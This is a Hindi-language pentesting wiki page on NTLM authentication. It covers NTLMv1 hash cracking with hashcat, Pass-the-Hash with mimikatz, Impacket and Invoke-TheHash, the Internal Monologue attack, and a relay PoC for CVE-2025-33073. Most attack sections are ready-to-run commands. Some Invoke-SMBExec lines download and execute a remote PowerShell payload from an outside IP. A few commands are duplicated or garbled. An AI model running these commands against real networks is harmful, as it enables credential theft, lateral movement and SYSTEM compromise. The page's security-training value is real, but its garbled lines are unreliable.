# NTLM

{{#include ../../banners/hacktricks-training.md}}


## मूल जानकारी

ऐसे environments में जहाँ **Windows XP और Server 2003** चल रहे हैं, LM (Lan Manager) hashes का उपयोग किया जाता है, हालांकि यह व्यापक रूप से ज्ञात है कि इन्हें आसानी से compromise किया जा सकता है। एक विशेष LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, यह दर्शाता है कि LM का उपयोग नहीं किया जा रहा है, और यह empty string के hash को represent करता है।

By default, **Kerberos** authentication protocol primary method होता है। NTLM (NT LAN Manager) कुछ खास परिस्थितियों में उपयोग में आता है: Active Directory का अभाव, domain का मौजूद न होना, गलत configuration के कारण Kerberos का malfunction होना, या जब connections को valid hostname के बजाय IP address का उपयोग करके attempt किया जाता है।

Network packets में **"NTLMSSP"** header की मौजूदगी NTLM authentication process का संकेत देती है।

Authentication protocols - LM, NTLMv1, और NTLMv2 - के लिए support एक specific DLL द्वारा दिया जाता है, जो `%windir%\Windows\System32\msv1\_0.dll` में स्थित है।

**Key Points**:

- LM hashes vulnerable होते हैं और empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) उनके non-use को दर्शाता है।
- Kerberos default authentication method है, और NTLM केवल कुछ खास परिस्थितियों में उपयोग होता है।
- NTLM authentication packets "NTLMSSP" header से पहचाने जा सकते हैं।
- LM, NTLMv1, और NTLMv2 protocols system file `msv1\_0.dll` द्वारा supported हैं।

## LM, NTLMv1 and NTLMv2

आप check और configure कर सकते हैं कि कौन सा protocol उपयोग होगा:

### GUI

_execute_ _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).

![](<../../images/image (919).png>)

### Registry

This will set the level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** अपने **credentials** दर्ज करता है
2. client machine **domain name** और **username** भेजते हुए एक **authentication request** भेजती है
3. **server** **challenge** भेजता है
4. **client** password के hash को key की तरह इस्तेमाल करके **challenge** को **encrypt** करता है और उसे response के रूप में भेजता है
5. **server** **Domain controller** को **domain name, username, challenge और response** भेजता है। अगर कोई Active Directory configured नहीं है या domain name, server का नाम है, तो credentials को **locally** check किया जाता है।
6. **domain controller checks if everything is correct** और जानकारी server को भेजता है

**server** और **Domain Controller** **Netlogon** server के जरिए एक **Secure Channel** बना सकते हैं क्योंकि Domain Controller server का password जानता है (यह **NTDS.DIT** db के अंदर होता है)।

### Local NTLM authentication Scheme

authentication ऊपर बताए गए तरीके जैसा ही है **before but** **server** **SAM** file के अंदर उस user का **hash** जानता है जो authenticate करने की कोशिश कर रहा है। इसलिए, Domain Controller से पूछने के बजाय, **server खुद** check करेगा कि user authenticate कर सकता है या नहीं।

### NTLMv1 Challenge

**challenge length** 8 bytes है और **response** 24 bytes लंबा होता है।

**NT hash (16bytes)** को **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)) में divide किया जाता है: **last part is filled with zeros**। फिर **challenge** को हर part के साथ अलग-अलग **ciphered** किया जाता है और resulting ciphered bytes को जोड़ा जाता है। Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- **randomness** की कमी
- 3 parts पर अलग-अलग **attack** करके NT hash निकाला जा सकता है
- **DES is crackable**
- 3º key हमेशा **5 zeros** से बनी होती है।
- **same challenge** होने पर **response** भी **same** होगा। इसलिए, victim को **challenge** के रूप में "**1122334455667788**" string दी जा सकती है और precomputed rainbow tables का उपयोग करके response पर attack किया जा सकता है।

### NTLMv1 attack

आजकल Unconstrained Delegation configured environments कम मिल रहे हैं, लेकिन इसका मतलब यह नहीं कि आप configured **Print Spooler service** को **abuse** नहीं कर सकते।

आप AD पर पहले से मौजूद कुछ credentials/sessions का उपयोग करके printer से अपने control वाले किसी **host** के खिलाफ authenticate करने के लिए कह सकते हैं। फिर `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **authentication challenge** को `1122334455667788` सेट कर सकते हैं, authentication attempt capture कर सकते हैं, और अगर वह **NTLMv1** से किया गया था तो आप उसे **crack** कर पाएंगे।\
अगर आप `responder` उपयोग कर रहे हैं, तो आप **flag `--lm`** का उपयोग करके **authentication** को **downgrade** करने की कोशिश कर सकते हैं।\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

याद रखें कि printer authentication के दौरान computer account का उपयोग करेगा, और computer accounts में **long and random passwords** होते हैं जिन्हें आप शायद सामान्य **dictionaries** से **crack** नहीं कर पाएंगे। लेकिन **NTLMv1** authentication **DES** का उपयोग करती है ([more info here](#ntlmv1-challenge)), इसलिए DES cracking के लिए विशेष services का उपयोग करके आप इसे crack कर पाएंगे (उदाहरण के लिए आप [https://crack.sh/](https://crack.sh) या [https://ntlmv1.com/](https://ntlmv1.com) का उपयोग कर सकते हैं)।

### NTLMv1 attack with hashcat

NTLMv1 को NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) के साथ भी तोड़ा जा सकता है, जो NTLMv1 messages को एक ऐसे method में format करता है जिसे hashcat से तोड़ा जा सकता है।

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
नीचे आउटपुट होगा:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
फ़ाइल के साथ सामग्री बनाएँ:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat चलाएँ (distributed के लिए hashtopolis जैसे tool का उपयोग करना सबसे अच्छा है) क्योंकि वरना इसमें कई दिन लगेंगे।
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस case में हमें इसका password पता है: password, इसलिए हम demo purposes के लिए cheat करने जा रहे हैं:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
अब हमें cracked des keys को NTLM hash के parts में convert करने के लिए hashcat-utilities का उपयोग करना होगा:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
आख़िरकार अंतिम हिस्सा:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
इन्हें एक साथ जोड़ें:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length 8 bytes** होती है और **2 responses** भेजे जाते हैं: एक **24 bytes** लंबी होती है और **दूसरी** की लंबाई **variable** होती है।

**पहली response** को **HMAC_MD5** का उपयोग करके ciphering द्वारा बनाया जाता है, जिसमें **client और domain** से बनी **string** होती है और **key** के रूप में **NT hash** का **hash MD4** इस्तेमाल होता है। फिर, **result** को **key** के रूप में उपयोग करके **HMAC_MD5** के जरिए **challenge** को cipher किया जाता है। इसमें **8 bytes का client challenge** जोड़ा जाएगा। Total: 24 B.

**दूसरी response** को **several values** (एक नया client challenge, **timestamp** ताकि **replay attacks** से बचा जा सके...) का उपयोग करके बनाया जाता है।

यदि आपके पास **pcap** है जिसने एक सफल authentication process को capture किया है, तो आप domain, username, challenge और response निकालने और password crack करने की कोशिश करने के लिए इस guide का पालन कर सकते हैं: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**एक बार जब आपके पास victim का hash आ जाए**, तो आप इसका उपयोग करके उसे **impersonate** कर सकते हैं।\
आपको एक **tool** का उपयोग करना होगा जो **उस hash का उपयोग करके NTLM authentication perform** करे, **या** आप एक नया **sessionlogon** बना सकते हैं और उस hash को **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication perform** किया जाए, **वही hash use** हो। आखिरी option वही है जो mimikatz करता है।

**कृपया याद रखें कि आप Computer accounts का उपयोग करके भी Pass-the-Hash attacks perform कर सकते हैं।**

### **Mimikatz**

**इसे administrator के रूप में run करना आवश्यक है**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह एक process लॉन्च करेगा जो उन users का होगा जिन्होंने mimikatz लॉन्च किया है, लेकिन internally LSASS में saved credentials mimikatz parameters के अंदर वाले होंगे। फिर, आप network resources को ऐसे access कर सकते हैं जैसे आप वही user हों ( `runas /netonly` trick जैसा, लेकिन आपको plain-text password जानने की जरूरत नहीं होगी)।

### Pass-the-Hash from linux

आप Linux से Windows machines में Pass-the-Hash का उपयोग करके code execution प्राप्त कर सकते हैं।\
[**इसे करने का तरीका यहाँ देखें।**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

आप [Windows के लिए impacket binaries यहाँ डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)।

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (इस मामले में आपको एक command specify करनी होगी, cmd.exe और powershell.exe interactive shell प्राप्त करने के लिए valid नहीं हैं)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- और भी कई Impacket binaries हैं...

### Invoke-TheHash

आप powershell scripts यहाँ से प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह function **बाकी सभी का एक mix** है। आप **कई hosts** pass कर सकते हैं, कुछ को **exclude** कर सकते हैं और जिस **option** को use करना चाहते हैं उसे **select** कर सकते हैं (_SMBExec, WMIExec, SMBClient, SMBEnum_)। अगर आप **SMBExec** और **WMIExec** में से **कोई भी** select करते हैं, लेकिन कोई _**Command**_ parameter **नहीं** देते, तो यह सिर्फ **check** करेगा कि आपके पास **enough permissions** हैं या नहीं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे administrator के रूप में run करना होगा**

यह tool वही काम करेगा जो mimikatz करता है (LSASS memory modify करना)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### username और password के साथ Manual Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host से credentials extract करना

**अधिक जानकारी के लिए** [**Windows host से credentials कैसे obtain करें, इसके लिए आपको यह page पढ़ना चाहिए**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack एक stealthy credential extraction technique है जो attacker को victim machine से NTLM hashes retrieve करने देती है **बिना LSASS process के साथ directly interact किए**। Mimikatz के विपरीत, जो hashes को सीधे memory से पढ़ता है और अक्सर endpoint security solutions या Credential Guard द्वारा block कर दिया जाता है, यह attack **NTLM authentication package (MSV1_0) को Security Support Provider Interface (SSPI) के माध्यम से local calls** का उपयोग करता है। Attacker सबसे पहले **NTLM settings को downgrade** करता है (जैसे, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ताकि NetNTLMv1 permitted हो। फिर वह चल रहे processes से प्राप्त existing user tokens को impersonate करता है और ज्ञात challenge का उपयोग करके NetNTLMv1 responses generate करने के लिए local NTLM authentication trigger करता है।

इन NetNTLMv1 responses को capture करने के बाद, attacker **precomputed rainbow tables** का उपयोग करके original NTLM hashes को जल्दी recover कर सकता है, जिससे आगे Pass-the-Hash attacks के लिए lateral movement संभव हो जाता है। Crucially, Internal Monologue Attack stealthy रहता है क्योंकि यह network traffic generate नहीं करता, code inject नहीं करता, या direct memory dumps trigger नहीं करता, इसलिए defenders के लिए इसे detect करना traditional methods जैसे Mimikatz की तुलना में अधिक कठिन होता है।

यदि NetNTLMv1 accepted नहीं है—enforced security policies के कारण, तो attacker NetNTLMv1 response retrieve करने में fail हो सकता है।

इस case को handle करने के लिए, Internal Monologue tool को update किया गया: यह `AcceptSecurityContext()` का उपयोग करके dynamically server token acquire करता है ताकि NetNTLMv1 fail होने पर भी **NetNTLMv2 responses capture** कर सके। हालांकि NetNTLMv2 crack करना काफी अधिक कठिन है, फिर भी यह limited cases में relay attacks या offline brute-force के लिए एक path खोलता है।

PoC **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** में मिल सकता है।

## NTLM Relay and Responder

**इन attacks को perform करने का अधिक detailed guide यहां पढ़ें:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## network capture से NTLM challenges parse करना

**आप यह use कर सकते हैं** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs के माध्यम से NTLM & Kerberos *Reflection* (CVE-2025-33073)

Windows में कई mitigations शामिल हैं जो *reflection* attacks को रोकने की कोशिश करते हैं, जहाँ किसी host से originate हुआ NTLM (या Kerberos) authentication वापस **same** host पर relay किया जाता है ताकि SYSTEM privileges प्राप्त किए जा सकें।

Microsoft ने MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) और बाद के patches के साथ अधिकांश public chains तोड़ दीं, हालांकि **CVE-2025-33073** दिखाता है कि protections अभी भी bypass की जा सकती हैं, क्योंकि **SMB client marshalled* (serialized) target-info वाले Service Principal Names (SPNs)** को कैसे truncate करता है, इसका दुरुपयोग किया जा सकता है।

### bug का TL;DR
1. Attacker एक **DNS A-record** register करता है जिसका label marshalled SPN encode करता है – जैसे
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim को उस hostname पर authenticate करने के लिए coerced किया जाता है (PetitPotam, DFSCoerce, आदि)।
3. जब SMB client target string `cifs/srv11UWhRCAAAAA…` को `lsasrv!LsapCheckMarshalledTargetInfo` को pass करता है, तब `CredUnmarshalTargetInfo` को call **serialized blob को strip** कर देता है, जिससे **`cifs/srv1`** बचता है।
4. अब `msv1_0!SspIsTargetLocalhost` (या Kerberos equivalent) target को *localhost* मानता है क्योंकि short host part computer name (`SRV1`) से match करता है।
5. परिणामस्वरूप, server `NTLMSSP_NEGOTIATE_LOCAL_CALL` set करता है और context में **LSASS’ SYSTEM access-token** inject करता है (Kerberos के लिए एक SYSTEM-marked subsession key बनता है)।
6. `ntlmrelayx.py` **या** `krbrelayx.py` के साथ इस authentication को relay करने पर उसी host पर full SYSTEM rights मिलते हैं।

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* **CVE-2025-33073** के लिए KB patch `mrxsmb.sys::SmbCeCreateSrvCall` में एक check जोड़ता है जो किसी भी SMB connection को block करता है जिसका target marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`) contain करता है।
* Unpatched hosts पर भी reflection रोकने के लिए **SMB signing** enforce करें।
* `*<base64>...*` जैसे दिखने वाले DNS records monitor करें और coercion vectors (PetitPotam, DFSCoerce, AuthIP...) block करें।

### Detection ideas
* `NTLMSSP_NEGOTIATE_LOCAL_CALL` वाले network captures, जहाँ client IP ≠ server IP हो।
* Kerberos AP-REQ जिसमें subsession key हो और client principal hostname के equal हो।
* Windows Event 4624/4648 SYSTEM logons, जिनके तुरंत बाद same host से remote SMB writes हों।

**March 2026** local reflection variant के लिए जो `SMB arbitrary ports` और `TCP connection reuse` का abuse करके `NT AUTHORITY\SYSTEM` तक पहुँचता है, देखें:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
